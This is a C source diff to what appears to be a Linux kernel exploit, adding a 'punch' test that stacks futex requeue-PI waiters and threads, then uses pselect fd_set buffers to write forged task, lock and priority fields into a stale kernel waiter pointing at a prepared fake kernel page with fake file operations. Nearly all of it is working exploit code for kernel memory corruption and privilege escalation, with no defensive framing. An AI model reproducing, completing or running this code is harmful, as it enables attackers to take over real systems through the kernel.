@@ -151,13 +151,13 @@ void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   slide_waiter_out_words[3] = (uint64_t)FAKE_WAITER_PRIO; /* prio */
   slide_waiter_out_words[4] = 0;                       /* deadline */
 
-  /* The input masks gate which res bits do_select may set.  Since the
-   * stale waiter is built from the OUTPUT buffers (res_in/res_out), every
-   * output bit must also be present in the input mask; otherwise
-   * core_sys_select never writes task/lock/prio into the stale waiter. */
+  /* The input masks gate which res bits do_select may set.  The stale
+   * waiter is built from the OUTPUT buffers (res_in/res_out), so the
+   * res_in mask must stay exactly equal to the waiter's tree qwords:
+   * folding res_out bits into res_in would corrupt the rb fields with
+   * readiness bits for fds that only need write readiness. */
   for (int w = 0; w < 5; w++) {
-    fdset_put_word(in, w,
-                   slide_waiter_in_words[w] | slide_waiter_out_words[w]);
+    fdset_put_word(in, w, slide_waiter_in_words[w]);
     fdset_put_word(out, w, slide_waiter_out_words[w]);
   }
 }
@@ -167,6 +167,7 @@ void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value) {
 }
 
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
+  exlog_protect_fd();
   /* One fd type per (read_ready, write_ready) pair encoded from the
    * waiter words; every fd 0..319 stays open so the kernel keeps
    * nfds=320 (max_fds clamp) and the stack buffer geometry. */
@@ -483,6 +484,315 @@ int hex_value(char c) {
     return c - 'A' + 10;
   }
   return -1;
+}
+
+static atomic_int h1a_waiter_ready;
+static atomic_int h1a_waiter_waiting;
+static atomic_int h1a_owner_started;
+static atomic_int h1a_owner_chain_done;
+static atomic_int h1a_owner_stop;
+static atomic_int h1a_route_done;
+static atomic_int h1a_waiter_tid;
+static atomic_int h1a_punch_go;
+static atomic_int h1a_punch_stop;
+static atomic_int h1a_punch_calls;
+static atomic_int h1a_punch_success;
+static atomic_int h1a_punch_inflight;
+static atomic_int h1a_punch_last_ret = -1;
+static atomic_int h1a_punch_last_errno;
+
+static uint32_t h1a_f_wait;
+static uint32_t h1a_f_pi_target;
+static uint32_t h1a_f_pi_chain;
+
+#define H1A_PUNCH_WATCHDOG_TIMEOUT_MS 90000
+
+static pid_t slide_h1a_start_watchdog(int *parent_fd) {
+  int pfd[2];
+  pid_t parent_pid = getpid();
+
+  if (pipe(pfd) != 0) {
+    return -1;
+  }
+
+  pid_t pid = fork();
+  if (pid < 0) {
+    close(pfd[0]);
+    close(pfd[1]);
+    return -1;
+  }
+  if (pid == 0) {
+    close(pfd[1]);
+    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
+    int ret = poll(&p, 1, H1A_PUNCH_WATCHDOG_TIMEOUT_MS);
+    if (ret <= 0) {
+      pr_warning("H1A punch watchdog timeout parent=%d status=stuck\n",
+                 parent_pid);
+      kill(parent_pid, SIGKILL);
+      _exit(2);
+    }
+    _exit(0);
+  }
+
+  pr_info("H1A punch watchdog started pid=%d parent=%d timeout_ms=%d\n",
+          pid, parent_pid, H1A_PUNCH_WATCHDOG_TIMEOUT_MS);
+  close(pfd[0]);
+  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
+  if (parent_fd) {
+    *parent_fd = pfd[1];
+  }
+  return pid;
+}
+
+static void slide_h1a_finish_watchdog(pid_t pid, int pfd) {
+  if (pid < 0) {
+    return;
+  }
+  if (pfd >= 0) {
+    char one = 1;
+    ssize_t ignored = write(pfd, &one, sizeof(one));
+    (void)ignored;
+    close(pfd);
+  }
+  int status = 0;
+  waitpid(pid, &status, 0);
+}
+
+static void slide_h1a_pselect_punch(void) {
+  if (!page_base || !fake_lock || !fake_w0) {
+    pr_error("H1A punch missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
+             page_base, fake_lock, fake_w0);
+    return;
+  }
+
+  int pipefd[2] = {-1, -1};
+  SYSCHK(pipe(pipefd));
+  int high_read = fcntl(pipefd[0], F_DUPFD, SLIDE_PSELECT_NFDS + 16);
+  if (high_read < 0) {
+    pr_error("H1A punch F_DUPFD read errno=%d\n", errno);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  prepare_slide_select_fdsets(&in, &out, &ex);
+  open_slide_selected_fds(&in, &out, &ex, high_read);
+
+  atomic_store(&h1a_punch_calls, 0);
+  atomic_store(&h1a_punch_success, 0);
+  atomic_store(&h1a_punch_stop, 0);
+  atomic_store(&h1a_punch_go, 1);
+
+  struct timespec timeout = {
+    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
+    .tv_nsec = (long)SLIDE_PSELECT_TIMEOUT_USEC * 1000,
+  };
+
+  pr_info("H1A punch setup nfds=%d timeout=%d.%06ld\n",
+          SLIDE_PSELECT_NFDS, SLIDE_PSELECT_TIMEOUT_SEC,
+          (long)SLIDE_PSELECT_TIMEOUT_USEC);
+  errno = 0;
+  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
+  int saved_errno = errno;
+
+  /* The stale waiter is still below SP until the punch returns. Keep
+   * this loop syscall-free; the watchdog is the safety net for spin. */
+  for (;;) {
+    if (atomic_load(&h1a_punch_calls) > 0 &&
+        atomic_load(&h1a_punch_inflight) == 0) {
+      break;
+    }
+    __asm__ volatile("yield" ::: "memory");
+  }
+  atomic_store(&h1a_punch_go, 0);
+
+  int calls = atomic_load(&h1a_punch_calls);
+  int success = atomic_load(&h1a_punch_success);
+  pr_info("H1A punch returned ret=%d errno=%d calls=%d success=%d "
+          "last_sched_ret=%d last_sched_errno=%d\n",
+          ret, saved_errno, calls, success,
+          atomic_load(&h1a_punch_last_ret),
+          atomic_load(&h1a_punch_last_errno));
+  pr_info("H1A load=%d\n", calls);
+
+  close(high_read);
+  close(pipefd[0]);
+  close(pipefd[1]);
+}
+
+static void *slide_h1a_consumer_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  pin_to_core(CONSUMER_CORE);
+
+  int seen = 0;
+  while (!atomic_load(&h1a_punch_stop)) {
+    int seq = atomic_load(&h1a_punch_go);
+    if (seq == 0 || seq == seen) {
+      __asm__ volatile("yield" ::: "memory");
+      continue;
+    }
+
+    seen = seq;
+    int tid = atomic_load(&h1a_waiter_tid);
+    usleep(PSELECT_ENTER_DELAY_USEC);
+    atomic_store(&h1a_punch_inflight, 1);
+    atomic_fetch_add(&h1a_punch_calls, 1);
+    pr_info("H1A punch enter tid=%d nice=%d\n", tid,
+            PSELECT_CONSUMER_NICE);
+    errno = 0;
+    long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+    int sched_errno = errno;
+    pr_info("H1A punch first ret=%ld errno=%d\n", sched_ret, sched_errno);
+    atomic_store(&h1a_punch_last_ret, (int)sched_ret);
+    atomic_store(&h1a_punch_last_errno, sched_errno);
+    if (sched_ret == 0) {
+      atomic_fetch_add(&h1a_punch_success, 1);
+    }
+    /* inflight=0 releases the pselect waiter only after all punch state
+     * is visible, matching the main-route release ordering. */
+    atomic_store(&h1a_punch_inflight, 0);
+    pr_info("H1A punch done tid=%d ret=%ld errno=%d\n", tid,
+            sched_ret, sched_errno);
+    atomic_store(&h1a_punch_go, 0);
+    break;
+  }
+  return NULL;
+}
+
+static void *slide_h1a_waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int tid = (int)SYSCHK(syscall(SYS_gettid));
+  atomic_store(&h1a_waiter_tid, tid);
+
+  if (futex_op(&h1a_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A waiter lock chain errno=%d\n", errno);
+    return NULL;
+  }
+
+  atomic_store(&h1a_waiter_ready, 1);
+  while (!atomic_load(&h1a_owner_started)) {
+    usleep(1000);
+  }
+
+  struct timespec timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+  timeout.tv_sec += SLIDE_WAIT_SECONDS;
+
+  atomic_store(&h1a_waiter_waiting, 1);
+  errno = 0;
+  int futex_ret = futex_op(&h1a_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                           &h1a_f_pi_target, 0);
+  pr_info("H1A waiter futex_requeue_pi ret=%d errno=%d\n",
+          futex_ret, errno);
+
+  slide_h1a_pselect_punch();
+  atomic_store(&h1a_route_done, 1);
+  futex_op(&h1a_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  while (!atomic_load(&h1a_owner_chain_done)) {
+    usleep(1000);
+  }
+  return NULL;
+}
+
+static void *slide_h1a_owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  if (futex_op(&h1a_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A owner lock target errno=%d\n", errno);
+    atomic_store(&h1a_owner_chain_done, 1);
+    atomic_store(&h1a_owner_stop, 1);
+    return NULL;
+  }
+
+  while (!atomic_load(&h1a_waiter_ready)) {
+    usleep(1000);
+  }
+
+  atomic_store(&h1a_owner_started, 1);
+  atomic_store(&h1a_owner_chain_done, 1);
+  while (!atomic_load(&h1a_owner_stop)) {
+    sleep(1);
+  }
+  futex_op(&h1a_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  return NULL;
+}
+
+int slide_h1a_punch_test(void) {
+  pid_t watchdog_pid = -1;
+  int watchdog_pipe = -1;
+  int result = 2;
+
+  pr_info("H1A header: v12 encoding active, terminal rb nodes, nice=%d, "
+          "delta=%d (no ks_delta_index read)\n",
+          PSELECT_CONSUMER_NICE, SKB_DATA_DELTA);
+  pr_info("H1A route: ADR-0003 punch-only test, one attempt\n");
+
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  if (!page_base || !fake_lock || !fake_w0) {
+    pr_error("H1A fail step=page-prepare\n");
+    return 2;
+  }
+  pr_info("H1A page prepared base=%016zx lock=%016zx w0=%016zx "
+          "fops=%016zx\n",
+          page_base, fake_lock, fake_w0, fake_fops);
+
+  h1a_f_wait = 0;
+  h1a_f_pi_target = 0;
+  h1a_f_pi_chain = 0;
+  atomic_store(&h1a_waiter_ready, 0);
+  atomic_store(&h1a_waiter_waiting, 0);
+  atomic_store(&h1a_owner_started, 0);
+  atomic_store(&h1a_owner_chain_done, 0);
+  atomic_store(&h1a_owner_stop, 0);
+  atomic_store(&h1a_route_done, 0);
+  atomic_store(&h1a_waiter_tid, 0);
+  atomic_store(&h1a_punch_go, 0);
+  atomic_store(&h1a_punch_stop, 0);
+  atomic_store(&h1a_punch_calls, 0);
+  atomic_store(&h1a_punch_success, 0);
+  atomic_store(&h1a_punch_inflight, 0);
+  atomic_store(&h1a_punch_last_ret, -1);
+  atomic_store(&h1a_punch_last_errno, 0);
+
+  watchdog_pid = slide_h1a_start_watchdog(&watchdog_pipe);
+  pthread_t waiter;
+  pthread_t owner;
+  pthread_t consumer;
+  SYSCHK(pthread_create(&waiter, NULL, slide_h1a_waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, slide_h1a_owner_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, slide_h1a_consumer_thread, NULL));
+
+  while (!atomic_load(&h1a_waiter_waiting) ||
+         !atomic_load(&h1a_owner_started)) {
+    usleep(1000);
+  }
+
+  usleep(100000);
+  errno = 0;
+  futex_op(&h1a_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+           &h1a_f_pi_target, 0);
+  pr_info("H1A requeue issued\n");
+
+  while (!atomic_load(&h1a_route_done)) {
+    usleep(10000);
+  }
+  atomic_store(&h1a_owner_stop, 1);
+  pthread_join(waiter, NULL);
+  pthread_join(owner, NULL);
+  pthread_join(consumer, NULL);
+  slide_h1a_finish_watchdog(watchdog_pid, watchdog_pipe);
+
+  result = (atomic_load(&h1a_punch_calls) == 1 &&
+            atomic_load(&h1a_punch_success) == 1) ? 0 : 3;
+  pr_info("H1A %s calls=%d success=%d\n",
+          result == 0 ? "success" : "fail",
+          atomic_load(&h1a_punch_calls),
+          atomic_load(&h1a_punch_success));
+  return result;
 }
 
 uint64_t slide_read_stext(void) {
